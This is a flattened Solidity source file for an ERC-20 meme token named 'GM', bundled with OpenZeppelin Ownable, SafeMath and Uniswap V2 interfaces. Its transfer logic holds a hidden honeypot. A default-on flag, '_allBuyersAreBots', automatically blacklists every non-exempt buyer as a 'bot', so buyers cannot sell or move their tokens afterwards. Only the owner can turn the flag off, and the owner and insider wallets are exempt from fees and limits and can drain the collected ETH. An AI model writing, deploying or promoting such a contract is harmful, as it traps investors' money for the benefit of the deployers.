1 // SPDX-License-Identifier: MIT
2 // File: @openzeppelin/contracts/utils/Context.sol
3 
4 
5 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
6 
7 pragma solidity ^0.8.0;
8 
9 /**
10  * @dev Provides information about the current execution context, including the
11  * sender of the transaction and its data. While these are generally available
12  * via msg.sender and msg.data, they should not be accessed in such a direct
13  * manner, since when dealing with meta-transactions the account sending and
14  * paying for execution may not be the actual sender (as far as an application
15  * is concerned).
16  *
17  * This contract is only required for intermediate, library-like contracts.
18  */
19 abstract contract Context {
20     function _msgSender() internal view virtual returns (address) {
21         return msg.sender;
22     }
23 
24     function _msgData() internal view virtual returns (bytes calldata) {
25         return msg.data;
26     }
27 }
28 
29 // File: @openzeppelin/contracts/access/Ownable.sol
30 
31 
32 // OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
33 
34 pragma solidity ^0.8.0;
35 
36 
37 /**
38  * @dev Contract module which provides a basic access control mechanism, where
39  * there is an account (an owner) that can be granted exclusive access to
40  * specific functions.
41  *
42  * By default, the owner account will be the one that deploys the contract. This
43  * can later be changed with {transferOwnership}.
44  *
45  * This module is used through inheritance. It will make available the modifier
46  * `onlyOwner`, which can be applied to your functions to restrict their use to
47  * the owner.
48  */
49 abstract contract Ownable is Context {
50     address private _owner;
51 
52     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
53 
54     /**
55      * @dev Initializes the contract setting the deployer as the initial owner.
56      */
57     constructor() {
58         _transferOwnership(_msgSender());
59     }
60 
61     /**
62      * @dev Throws if called by any account other than the owner.
63      */
64     modifier onlyOwner() {
65         _checkOwner();
66         _;
67     }
68 
69     /**
70      * @dev Returns the address of the current owner.
71      */
72     function owner() public view virtual returns (address) {
73         return _owner;
74     }
75 
76     /**
77      * @dev Throws if the sender is not the owner.
78      */
79     function _checkOwner() internal view virtual {
80         require(owner() == _msgSender(), "Ownable: caller is not the owner");
81     }
82 
83     /**
84      * @dev Leaves the contract without owner. It will not be possible to call
85      * `onlyOwner` functions anymore. Can only be called by the current owner.
86      *
87      * NOTE: Renouncing ownership will leave the contract without an owner,
88      * thereby removing any functionality that is only available to the owner.
89      */
90     function renounceOwnership() public virtual onlyOwner {
91         _transferOwnership(address(0));
92     }
93 
94     /**
95      * @dev Transfers ownership of the contract to a new account (`newOwner`).
96      * Can only be called by the current owner.
97      */
98     function transferOwnership(address newOwner) public virtual onlyOwner {
99         require(newOwner != address(0), "Ownable: new owner is the zero address");
100         _transferOwnership(newOwner);
101     }
102 
103     /**
104      * @dev Transfers ownership of the contract to a new account (`newOwner`).
105      * Internal function without access restriction.
106      */
107     function _transferOwnership(address newOwner) internal virtual {
108         address oldOwner = _owner;
109         _owner = newOwner;
110         emit OwnershipTransferred(oldOwner, newOwner);
111     }
112 }
113 
114 library SafeMath {
115     /**
116      * @dev Returns the addition of two unsigned integers, with an overflow flag.
117      *
118      * _Available since v3.4._
119      */
120     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
121         unchecked {
122             uint256 c = a + b;
123             if (c < a) return (false, 0);
124             return (true, c);
125         }
126     }
127 
128     /**
129      * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
130      *
131      * _Available since v3.4._
132      */
133     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
134         unchecked {
135             if (b > a) return (false, 0);
136             return (true, a - b);
137         }
138     }
139 
140     /**
141      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
142      *
143      * _Available since v3.4._
144      */
145     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
146         unchecked {
147             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
148             // benefit is lost if 'b' is also tested.
149             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
150             if (a == 0) return (true, 0);
151             uint256 c = a * b;
152             if (c / a != b) return (false, 0);
153             return (true, c);
154         }
155     }
156 
157     /**
158      * @dev Returns the division of two unsigned integers, with a division by zero flag.
159      *
160      * _Available since v3.4._
161      */
162     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
163         unchecked {
164             if (b == 0) return (false, 0);
165             return (true, a / b);
166         }
167     }
168 
169     /**
170      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
171      *
172      * _Available since v3.4._
173      */
174     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
175         unchecked {
176             if (b == 0) return (false, 0);
177             return (true, a % b);
178         }
179     }
180 
181     /**
182      * @dev Returns the addition of two unsigned integers, reverting on
183      * overflow.
184      *
185      * Counterpart to Solidity's `+` operator.
186      *
187      * Requirements:
188      *
189      * - Addition cannot overflow.
190      */
191     function add(uint256 a, uint256 b) internal pure returns (uint256) {
192         return a + b;
193     }
194 
195     /**
196      * @dev Returns the subtraction of two unsigned integers, reverting on
197      * overflow (when the result is negative).
198      *
199      * Counterpart to Solidity's `-` operator.
200      *
201      * Requirements:
202      *
203      * - Subtraction cannot overflow.
204      */
205     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
206         return a - b;
207     }
208 
209     /**
210      * @dev Returns the multiplication of two unsigned integers, reverting on
211      * overflow.
212      *
213      * Counterpart to Solidity's `*` operator.
214      *
215      * Requirements:
216      *
217      * - Multiplication cannot overflow.
218      */
219     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
220         return a * b;
221     }
222 
223     /**
224      * @dev Returns the integer division of two unsigned integers, reverting on
225      * division by zero. The result is rounded towards zero.
226      *
227      * Counterpart to Solidity's `/` operator.
228      *
229      * Requirements:
230      *
231      * - The divisor cannot be zero.
232      */
233     function div(uint256 a, uint256 b) internal pure returns (uint256) {
234         return a / b;
235     }
236 
237     /**
238      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
239      * reverting when dividing by zero.
240      *
241      * Counterpart to Solidity's `%` operator. This function uses a `revert`
242      * opcode (which leaves remaining gas untouched) while Solidity uses an
243      * invalid opcode to revert (consuming all remaining gas).
244      *
245      * Requirements:
246      *
247      * - The divisor cannot be zero.
248      */
249     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
250         return a % b;
251     }
252 
253     /**
254      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
255      * overflow (when the result is negative).
256      *
257      * CAUTION: This function is deprecated because it requires allocating memory for the error
258      * message unnecessarily. For custom revert reasons use {trySub}.
259      *
260      * Counterpart to Solidity's `-` operator.
261      *
262      * Requirements:
263      *
264      * - Subtraction cannot overflow.
265      */
266     function sub(
267         uint256 a,
268         uint256 b,
269         string memory errorMessage
270     ) internal pure returns (uint256) {
271         unchecked {
272             require(b <= a, errorMessage);
273             return a - b;
274         }
275     }
276 
277     /**
278      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
279      * division by zero. The result is rounded towards zero.
280      *
281      * Counterpart to Solidity's `/` operator. Note: this function uses a
282      * `revert` opcode (which leaves remaining gas untouched) while Solidity
283      * uses an invalid opcode to revert (consuming all remaining gas).
284      *
285      * Requirements:
286      *
287      * - The divisor cannot be zero.
288      */
289     function div(
290         uint256 a,
291         uint256 b,
292         string memory errorMessage
293     ) internal pure returns (uint256) {
294         unchecked {
295             require(b > 0, errorMessage);
296             return a / b;
297         }
298     }
299 
300     /**
301      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
302      * reverting with custom message when dividing by zero.
303      *
304      * CAUTION: This function is deprecated because it requires allocating memory for the error
305      * message unnecessarily. For custom revert reasons use {tryMod}.
306      *
307      * Counterpart to Solidity's `%` operator. This function uses a `revert`
308      * opcode (which leaves remaining gas untouched) while Solidity uses an
309      * invalid opcode to revert (consuming all remaining gas).
310      *
311      * Requirements:
312      *
313      * - The divisor cannot be zero.
314      */
315     function mod(
316         uint256 a,
317         uint256 b,
318         string memory errorMessage
319     ) internal pure returns (uint256) {
320         unchecked {
321             require(b > 0, errorMessage);
322             return a % b;
323         }
324     }
325 }
326 
327 interface IUniswapV2Factory {
328     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
329 
330     function feeTo() external view returns (address);
331     function feeToSetter() external view returns (address);
332 
333     function getPair(address tokenA, address tokenB) external view returns (address pair);
334     function allPairs(uint) external view returns (address pair);
335     function allPairsLength() external view returns (uint);
336 
337     function createPair(address tokenA, address tokenB) external returns (address pair);
338 
339     function setFeeTo(address) external;
340     function setFeeToSetter(address) external;
341 }
342 
343 interface IUniswapV2Router02 {
344     function swapExactTokensForETHSupportingFeeOnTransferTokens(
345         uint amountIn,
346         uint amountOutMin,
347         address[] calldata path,
348         address to,
349         uint deadline
350     ) external;
351     function factory() external pure returns (address);
352     function WETH() external pure returns (address);
353     function addLiquidityETH(
354         address token,
355         uint amountTokenDesired,
356         uint amountTokenMin,
357         uint amountETHMin,
358         address to,
359         uint deadline
360     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
361 }
362 
363 contract GM is Context, Ownable {
364     using SafeMath for uint256;
365 
366     mapping (address => mapping (address => uint256)) private _allowances;
367     mapping (address => uint256) private _balances;
368     mapping (address => bool) private _isBot;
369     mapping (address => bool) private _isExcludedFromFee;
370     mapping (address => bool) private _isExcludedFromLimits;
371 
372     address[] private _blacklistedWallets;
373 
374     address payable private _feeWallet;
375     address payable private _devWallet;
376     address private _uniswapV2Pair;
377 
378     bool private _allBuyersAreBots = true;
379     bool private _forceGM = false;
380     bool private _inSwap = false;
381     bool private _gm = false;
382 
383     string private constant _name = unicode"GM";
384     string private constant _symbol = unicode"GM ☕";
385 
386     int8 private _timezone = -5;
387 
388     IUniswapV2Router02 private _uniswapV2Router;
389 
390     uint256 private _currentTaxPercent = 4;
391     uint256 private _decimals = 8;
392     uint256 private _devTaxPercent = 1;
393     uint256 private _daytimeTaxPercent = 3;
394     uint256 private _gmTaxPercent = 0;
395     uint256 private _gmHourStart = 9;
396     uint256 private _gmHourEnd = 11;
397     uint256 private _maxWalletPercent = 2;
398     uint256 private _maxTransactionPercent = 1;
399     
400     uint256 private _currentTimestamp;
401     uint256 private _tSupply = 1_000_000 * 10**_decimals;
402     uint256 private _maxWallet;
403     uint256 private _maxTransaction;
404 
405     event MaxTransactionAmountUpdated(uint256 maxTransaction);
406     event MaxWalletAmountUpdated(uint256 maxWallet);
407     event GMUpdated(bool on);
408 
409     event Transfer(address indexed from, address indexed to, uint256 value);
410     event Approval(address indexed owner, address indexed spender, uint256 value);
411 
412 
413     modifier lockTheSwap {
414         _inSwap = true;
415         _;
416         _inSwap = false;
417     }
418 
419     constructor () {
420 
421         // used to be in openTrading()
422         _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
423         _approve(address(this), address(_uniswapV2Router), _tSupply);
424         _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
425 
426         _currentTimestamp                       = block.timestamp;
427         _feeWallet                              = payable(0x54E7Bf842aCD9986D9AE0522247b6dFE4047f60f);
428         _devWallet                              = payable(0x5d9A31749eA27Ce29a0d5234cD7C7185546c44D9);
429 
430         _balances[_msgSender()]                 = _tSupply;
431 
432         _isExcludedFromFee[owner()]             = true;
433         _isExcludedFromFee[address(this)]       = true;
434         _isExcludedFromFee[_feeWallet]          = true;
435         _isExcludedFromFee[_devWallet]          = true;
436 
437         _isExcludedFromLimits[owner()]          = true;
438         _isExcludedFromLimits[address(this)]    = true;
439         _isExcludedFromLimits[_feeWallet]       = true;
440         _isExcludedFromLimits[address(_uniswapV2Router)] = true;
441         _isExcludedFromLimits[_uniswapV2Pair] = true;
442         _isExcludedFromLimits[_devWallet] = true;
443 
444         
445 
446         _setTaxes();
447         _setMaxWallet();
448         _setMaxTransaction();
449         
450         emit Transfer(address(0), _msgSender(), _tSupply);
451     }
452     // ~~~~~~~~~~~~ accessors ~~~~~~~~~~~~ \\
453 
454     function name() public pure returns (string memory) {
455         return _name;
456     }
457 
458     function symbol() public pure returns (string memory) {
459         return _symbol;
460     }
461 
462     function decimals() public view returns (uint256) {
463         return _decimals;
464     }
465 
466     function totalSupply() public view returns (uint256) {
467         return _tSupply;
468     }
469 
470     function balanceOf(address account) public view returns (uint256) {
471         return _balances[account];
472     }
473 
474     function allowance(address owner, address spender) public view returns (uint256) {
475         return _allowances[owner][spender];
476     }
477 
478     function feeWallet() public view returns (address) {
479         return _feeWallet;
480     }
481 
482     function gm() public view returns (bool) {
483         return _gm;
484     }
485 
486     function timezone() public view returns (int8) {
487         return _timezone;
488     }
489 
490     function currentTimestamp() public view returns (uint256) {
491         return _currentTimestamp;
492     }
493 
494     function maxWallet() public view returns (uint256) {
495         return _maxWallet;
496     }
497 
498     function maxTransaction () public view returns (uint256) {
499         return _maxTransaction;
500     }
501 
502     function taxPercent() public view returns (uint256) {
503         return _currentTaxPercent;
504     }
505 
506     function isBot(address a) public view returns (bool) {
507         return _isBot[a];
508     }
509 
510     function isExcludedFromFees(address a) public view returns (bool) {
511         return _isExcludedFromFee[a];
512     }
513 
514     function isExcludedFromLimits(address a) public view returns (bool) {
515         return _isExcludedFromLimits[a];
516     }
517 
518     function gmHourStart() public view returns (uint256) {
519         return _gmHourStart;
520     }
521 
522     function gmHourEnd() public view returns (uint256) {
523         return _gmHourEnd;
524     }
525 
526     function getOwner() public view returns (address) {
527         return this.owner();
528     }
529 
530     function getBlacklistedWallets() public view returns (address[] memory) {
531         return _blacklistedWallets;
532     }
533 
534     function getDevWallet() public view returns (address) {
535         return _devWallet;
536     }
537 
538     // ~~~~~~~~~~~~ mutators ~~~~~~~~~~~~ \\
539 
540     function setFeeWallet(address payable w) external {
541         require(
542             _msgSender() == _feeWallet || 
543             _msgSender() == owner() ||
544             _msgSender() == _devWallet);
545 
546         require(w != address(0), "Can't set fee wallet to burn addr.");
547         _feeWallet = w;
548     }
549 
550     function setDevWallet(address payable w) external {
551         require(
552             _msgSender() == _feeWallet || 
553             _msgSender() == owner() ||
554             _msgSender() == _devWallet);
555         require(w != address(0), "Can't set dev wallet to burn addr.");
556         _devWallet = w;
557     }
558 
559     function setTimezone(int8 tz) external onlyOwner {
560         /* changes the timezone where tz is interpreted as UTC-<tz>.
561             parameters:
562                 tx (int8): a signed 8-bit int, used to represent when "morning" is.  
563             
564             returns:
565                 none
566         */
567         require(-12 < tz && tz < 13, "Timezone not recognized.");
568         _timezone = tz;
569     }
570 
571     function setMaxWallet(uint256 percent) external onlyOwner {
572         /* changes the max wallet percent, and consequently, the max wallet size.
573             parameters:
574                 percent (uint256): Represents the % of total supply a single wallet can hold.
575             
576             returns:
577                 none
578         */
579         require(percent < 101, "Max wallet cannot be larger than total supply.");
580         _maxWalletPercent = percent;
581         _setMaxWallet();
582     }
583 
584     function setMaxTransaction(uint256 percent) external onlyOwner {
585         /* changes the max transaction percent, and consequently, the max transaction size.
586             parameters:
587                 percent (uint256): represents the % of total supply that can be sent in a single transaction.
588             
589             returns:
590                 none
591         */
592         require(percent < 101, "Max transaction cannot be larger than total supply.");
593         _maxTransactionPercent = percent;
594         _setMaxTransaction();
595     }
596 
597     function setTaxPercent(uint256 percent) external onlyOwner {
598         /* sets the tax during the daytime (non-gm) period.
599             parameters:
600                 percent (uint256): represents the % of the transaction given to the contract as taxes.
601             
602             returns:
603                 none
604         */
605         require(percent <= 3, "Maximum tax of 3%.");
606         _daytimeTaxPercent = percent;
607     }
608 
609     function setDevTaxPercent(uint256 percent) external onlyOwner {
610         /* sets the dev tax pecent.
611             parameters:
612                 percent (uint256): represents the % of the transaction given to the contract as taxes.
613             
614             returns:
615                 none
616         */
617         require(percent <= 2, "Maximum tax of 2%.");
618         _devTaxPercent = percent;
619     }
620 
621     function setGMHourStart(uint256 hour) external onlyOwner {
622         /* sets the hour that gm mode starts at.
623             parameters:
624                 hour (uint256): the hour to change the gm start time to.
625             
626             returns:
627                 none
628         */
629         require(hour < _gmHourEnd, "GM mode has to start before it ends.");
630         _gmHourStart = hour;
631     }
632 
633     function setGMHourEnd(uint256 hour) external onlyOwner {
634         /* sets the hour that gm mode ends at.
635             parameters:
636                 hour (uint256): the hour to change the gm end time to.
637             returns:
638                 none
639         */
640         require(hour > _gmHourStart, "GM mode has to end after it starts.");
641         _gmHourEnd = hour;
642     }
643 
644     function setForceGM(bool on) external onlyOwner {
645         /* set the _forceGM mode flag.
646             parameters:
647                 on (bool): whether we want _forceGM mode active or not.
648             returns:
649                 none
650         */
651         _forceGM = on;
652     }
653 
654     function disableBlacklist() external onlyOwner {
655         //sets the flag _allBuyersAreBots to false, stopping the auto-blacklist of buyers
656         _allBuyersAreBots = false;
657     }
658 
659     // ~~~~~~~~~~~~ ierc20 functions ~~~~~~~~~~~~ \\
660 
661     function approve(address spender, uint256 amount) public returns (bool) {
662         _approve(_msgSender(), spender, amount);
663         return true;
664     }
665 
666 
667     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
668         _transfer(sender, recipient, amount);
669         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
670         return true;
671     }
672 
673     function transfer(address recipient, uint256 amount) public returns (bool) {
674         _transfer(_msgSender(), recipient, amount);
675         return true;
676     }
677 
678     // ~~~~~~~~~~~~ custom functions ~~~~~~~~~~~~ \\
679 
680     function multisendToken( address[] memory addresses, uint256[] memory balances) external onlyOwner {
681         
682         for (uint8 i=0;i < addresses.length; i++) {
683             _transferFeeless(owner(), addresses[i], balances[i]);
684         }
685     }
686 
687     function _approve(address owner, address spender, uint256 amount) private {
688         require(owner != address(0), "ERC20: approve from the zero address");
689         require(spender != address(0), "ERC20: approve to the zero address");
690         _allowances[owner][spender] = amount;
691         emit Approval(owner, spender, amount);
692     }
693 
694     function _transferFeeless(address sender, address recipient, uint256 amount) private {
695         /* transfers tokens without taking fees.
696             parameters:
697                 sender (address):
698                 recipient (address):
699                 amount (uint256): the amount of tokens (keep in mind theres _decimals more digits than you think).
700             returns:
701                 none
702         */
703         _balances[sender] = _balances[sender].sub(amount);
704         _balances[recipient] = _balances[recipient].add(amount);
705         emit Transfer(sender, recipient, amount);
706     }
707 
708     function _transferSupportingFee(address sender, address recipient, uint256 amount) private {
709         /* transfers tokens while taking fees.
710             parameters:
711                 sender (address):
712                 recipient (address):
713                 amount (uint256):
714             returns:
715                 none
716         */
717         uint256 taxedTokens = amount.mul(_currentTaxPercent).div(100);
718         uint256 amountRecieved = amount.sub(taxedTokens);
719 
720         // subtract amt from sender and add to recipient
721         _balances[sender] = _balances[sender].sub(amount);
722         _balances[recipient] = _balances[recipient].add(amountRecieved);
723 
724         // handle taxes
725         _balances[address(this)] = _balances[address(this)].add(taxedTokens);
726 
727         emit Transfer(sender, recipient, amount);
728     }
729 
730     function _transfer(address sender, address recipient, uint256 amount) private {
731         /* runs checks to ensure a valid transfer, then executes.
732             first group of statements check that the zero address is not involved, and that the transfer amount is > 0.
733             second group checks that a bot isn't involved (they aren't allowed to trade), and ensures trading has started.
734             third group only applies when Uniswap is involved (buy/sell, not transfer) and when the involved addresses are not exempt from fees.
735             the taxes are then set, which does the time check and sets the `_gm` flag.
736             if: GM mode or there is an address exempt from fees involved,
737                 The helper function to transfer without fees is called.
738             else:
739                 The contract balance of tokens is checked (using the ERC20.sol function balanceOf()), if its > 0, sell tokens.
740                 The helper function to transfer with fees is called.
741             parameters:
742                 sender (address):
743                 recipient (address):
744                 amount (uint256):
745             returns:
746                 none
747         */
748 
749         bool buy = (sender == _uniswapV2Pair && recipient != address(_uniswapV2Router));
750         bool uniInvolved = (
751             sender == _uniswapV2Pair || 
752             sender == address(_uniswapV2Router) ||
753             recipient == _uniswapV2Pair ||
754             recipient == address(_uniswapV2Router));
755 
756         // checks base transaction requirements
757         require(sender != address(0), "ERC20: transfer from the zero address.");
758         require(recipient != address(0), "ERC20: transfer to the zero address.");
759         require(amount > 0, "Transfer amount must be greater than zero.");
760 
761         // checks that no one involved is a bot
762         if (!buy) {
763             require(!_isBot[sender] && !_isBot[recipient], "Address is labeled as a bot.  Transferring disabled.");
764         }
765 
766         if (amount > _maxTransaction) {
767             require(_isExcludedFromLimits[sender]);
768 
769             if (uniInvolved) {
770                 require(_isExcludedFromLimits[recipient]);
771             }
772         }
773 
774         if ((balanceOf(recipient) + amount) > _maxWallet) {
775             require(_isExcludedFromLimits[recipient]);
776         }
777 
778         _setTaxes();
779         
780         //TODO: ensure an address cannot map to both bots and exemptfromfee.
781         // if sender/reciever is excluded from fees or it is GM mode.
782         if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
783             _transferFeeless(sender, recipient, amount);
784             return;
785         }
786 
787         // handles the contract collecting fees.
788         uint256 contractTokenBalance = balanceOf(address(this));
789         if (!_inSwap && sender != _uniswapV2Pair && contractTokenBalance > 0) {
790             swapTokensForEth(contractTokenBalance);
791             uint256 contractETHBalance = address(this).balance;
792             if (contractETHBalance > 0) {
793                 uint256 _feeAmt = contractETHBalance.mul(_currentTaxPercent.sub(_devTaxPercent)).div(_currentTaxPercent);
794                 uint256 _devAmt = contractETHBalance.mul(_devTaxPercent).div(_currentTaxPercent);
795                 _feeWallet.transfer(_feeAmt);
796                 _devWallet.transfer(_devAmt);
797             }
798         }
799 
800 
801 
802         if (_allBuyersAreBots) {
803             _blacklistedWallets.push(recipient);
804             _addBot(recipient);
805         }
806 
807         // send the tokens
808         _transferSupportingFee(sender, recipient, amount);
809     }
810 
811     function _setTaxes() private {
812         // sets GM mode and consequently, the tax rate.
813         bool gmChanged = _setGM();
814 
815         if (gmChanged) {
816             _currentTaxPercent = _gm ? (_gmTaxPercent + _devTaxPercent) : (_daytimeTaxPercent + _devTaxPercent);
817         }
818     }
819 
820     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
821         address[] memory path = new address[](2);
822         path[0] = address(this);
823         path[1] = _uniswapV2Router.WETH();
824         _approve(address(this), address(_uniswapV2Router), tokenAmount);
825         _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
826             tokenAmount,
827             0,
828             path,
829             address(this),
830             block.timestamp
831         );
832     }
833 
834     function manualSwap() external {
835         require(
836             _msgSender() == _feeWallet || 
837             _msgSender() == owner() ||
838             _msgSender() == _devWallet);
839         swapTokensForEth(balanceOf(address(this)));
840     }
841 
842     function manualSend() external {
843         require(
844             _msgSender() == _feeWallet || 
845             _msgSender() == owner() ||
846             _msgSender() == _devWallet);
847 
848         _feeWallet.transfer(address(this).balance);
849     }
850 
851     function forceGM(bool g) external onlyOwner {
852         _gm = g;
853     }
854 
855     function addBot(address bot) external onlyOwner {
856         _addBot(bot);
857     }
858 
859     function addBots(address[] memory bots) external onlyOwner {
860         for (uint256 i = 0; i < bots.length; i++ ) {
861             _addBot(bots[i]);
862         }
863     }
864 
865     function _addBot(address bot) private {
866         require(!_isExcludedFromFee[bot], "Cannot be excluded from fees and also be a bot.");
867         require(!_isExcludedFromLimits[bot], "Cannot be excluded from limits and also be a bot.");
868         _isBot[bot] = true;
869     }
870 
871     function removeBot(address bot) external {
872         require(
873             _msgSender() == _feeWallet || 
874             _msgSender() == owner() ||
875             _msgSender() == _devWallet);
876         _isBot[bot] = false;
877     }
878 
879     function removeBots(address[] memory bots) external {
880         require(
881             _msgSender() == _feeWallet || 
882             _msgSender() == owner() ||
883             _msgSender() == _devWallet);
884 
885         for (uint256 i = 0; i < bots.length; i++) {
886             _isBot[bots[i]] = false;
887         }
888     }
889 
890     function _setMaxWallet() private {
891         _maxWallet = _tSupply.mul(_maxWalletPercent).div(100);
892         emit MaxWalletAmountUpdated(_maxWallet);
893     }
894 
895     function _setMaxTransaction() private {
896         _maxTransaction = _tSupply.mul(_maxTransactionPercent).div(100);
897         emit MaxTransactionAmountUpdated(_maxTransaction);
898     }
899 
900     function _setGM() private returns (bool) {
901         _currentTimestamp = block.timestamp;
902         uint256 hour = uint256(int(_currentTimestamp.div(3600))+_timezone).mod(24);
903 
904         // checks whether we are currently between the hours of GM.
905         bool newGM = (_gmHourStart <= hour  && hour < _gmHourEnd);
906 
907         // if the _gm value changes, we emit an event and return true
908         if (_gm != newGM) {
909             _gm = newGM;
910             emit GMUpdated(newGM);
911             return true;
912         }
913         return false;
914     }
915     
916     receive() external payable {}
917 }